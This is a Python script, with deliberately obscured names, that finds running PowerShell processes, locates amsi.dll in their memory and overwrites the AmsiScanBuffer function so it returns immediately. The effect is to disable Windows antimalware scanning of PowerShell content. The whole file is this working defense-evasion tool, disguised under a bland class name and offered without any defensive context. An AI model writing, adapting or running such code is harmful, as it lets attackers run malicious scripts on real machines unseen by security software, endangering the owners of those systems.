import ctypes as _c, subprocess as _s, sys as _sy, logging as _l

# Configure logging
_l.basicConfig(level=_l.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')

# Load KERNEL32 DLL
_k = _c.windll.kernel32

# Constants
_P = (
    0x000F0000 |  # STANDARD_RIGHTS_REQUIRED
    0x00100000 |  # SYNCHRONIZE
    0xFFFF  # PROCESS_ALL_ACCESS
)
_RW = 0x40

class FunctionModifier:
    def __init__(self, _mn: str, _fn: str):
        self._mn = _mn
        self._fn = _fn

    def _rb(self, _h, _ba, _asb):
        _k.ReadProcessMemory.argtypes = [_c.c_void_p, _c.c_void_p, _c.c_void_p, _c.c_size_t, _c.POINTER(_c.c_ulong)]

        while True:
            _lb = _c.create_string_buffer(b'', len(_asb))
            _nb = _c.c_ulong(0)

            _k.ReadProcessMemory(_h, _ba, _lb, len(_lb), _c.byref(_nb))

            if _lb.value == _asb or _lb.value.startswith(b'\x29\xc0\xc3'):
                return _ba
            else:
                _ba += 1

    def _wb(self, _h, _a, _b):
        _nb = _c.c_size_t(0)
        _k.WriteProcessMemory.argtypes = [_c.c_void_p, _c.c_void_p, _c.c_void_p, _c.c_size_t, _c.POINTER(_c.c_size_t)]
        _k.VirtualProtectEx.argtypes = [_c.c_void_p, _c.c_void_p, _c.c_size_t, _c.c_ulong, _c.POINTER(_c.c_ulong)]

        _op = _c.c_ulong(0)
        _r = _k.VirtualProtectEx(_h, _a, len(_b), _RW, _c.byref(_op))
        if not _r:
            _l.error(f'VirtualProtectEx Error: {_k.GetLastError()}')
            return False

        _r = _k.WriteProcessMemory(_h, _a, _b, len(_b), _c.byref(_nb))
        if not _r:
            _l.error(f'WriteProcessMemory Error: {_k.GetLastError()}')
            return False

        _k.VirtualProtectEx(_h, _a, len(_b), _op.value, _c.byref(_op))
        return True

    def _gasba(self, _h, _ba):
        _asb = (
            b'\x4c\x8b\xdc' +
            b'\x49\x89\x5b\x08' +
            b'\x49\x89\x6b\x10' +
            b'\x49\x89\x73\x18' +
            b'\x57' +
            b'\x41\x56' +
            b'\x41\x57' +
            b'\x48\x83\xec\x70'
        )
        return self._rb(_h, _ba, _asb)

    def _pasb(self, _h, _fa):
        _pp = (
            b'\x29\xc0' +  # xor eax,eax
            b'\xc3'  # ret
        )
        return self._wb(_h, _fa, _pp)

    def _gadba(self, _h, _pid):
        _MP = 260
        _MM32 = 255
        _TSM = 0x00000008

        class _ME32(_c.Structure):
            _fields_ = [
                ('dwSize', _c.c_ulong),
                ('th32ModuleID', _c.c_ulong),
                ('th32ProcessID', _c.c_ulong),
                ('GlblcntUsage', _c.c_ulong),
                ('ProccntUsage', _c.c_ulong),
                ('modBaseAddr', _c.c_void_p),
                ('modBaseSize', _c.c_ulong),
                ('hModule', _c.c_void_p),
                ('szModule', _c.c_char * (_MM32+1)),
                ('szExePath', _c.c_char * _MP)
            ]

        _me32 = _ME32()
        _me32.dwSize = _c.sizeof(_ME32)

        _sh = _k.CreateToolhelp32Snapshot(_TSM, _pid)
        if _sh == -1:
            _l.error(f'CreateToolhelp32Snapshot Error: {_k.GetLastError()}')
            return None

        _r = _k.Module32First(_sh, _c.byref(_me32))
        while _r:
            if _me32.szModule == b'amsi.dll':
                _l.debug(f'Found base address of {_me32.szModule.decode()}: {hex(_me32.modBaseAddr)}')
                _k.CloseHandle(_sh)
                return self._gasba(_h, _me32.modBaseAddr)
            else:
                _r = _k.Module32Next(_sh, _c.byref(_me32))

        _k.CloseHandle(_sh)
        return None

    def _gpp(self):
        _cmd = 'tasklist /fi "imagename eq powershell.exe" /fo csv'
        _o = _s.check_output(_cmd, shell=True).decode()
        _ls = _o.strip().split('\n')[1:]
        _p = [int(_l.split(',')[1].strip('"')) for _l in _ls]
        return _p

    def _mf(self, _nb):
        _p = self._gpp()
        for _pid in _p:
            _ph = _k.OpenProcess(_P, False, _pid)
            if not _ph:
                _l.error(f'Failed to open process {_pid}')
                continue

            _l.debug(f'Got process handle of PID powershell at {_pid}: {hex(_ph)}')
            _l.debug(f'Trying to find AmsiScanBuffer in {_pid} process memory...')

            _adba = self._gadba(_ph, _pid)
            if not _adba:
                _l.error(f'Error finding AmsiDllBaseAddress in {_pid}. Error: {_k.GetLastError()}')
                continue
            else:
                _l.debug(f'Trying to patch AmsiScanBuffer found at {hex(_adba)}')

                if not self._pasb(_ph, _adba):
                    _l.error(f'Error patching AmsiScanBuffer in {_pid}. Error: {_k.GetLastError()}')
                    continue
                else:
                    _l.debug(f'Success patching AmsiScanBuffer in PID {_pid}')

            _k.CloseHandle(_ph)
            _l.debug('Closed process handle\n')
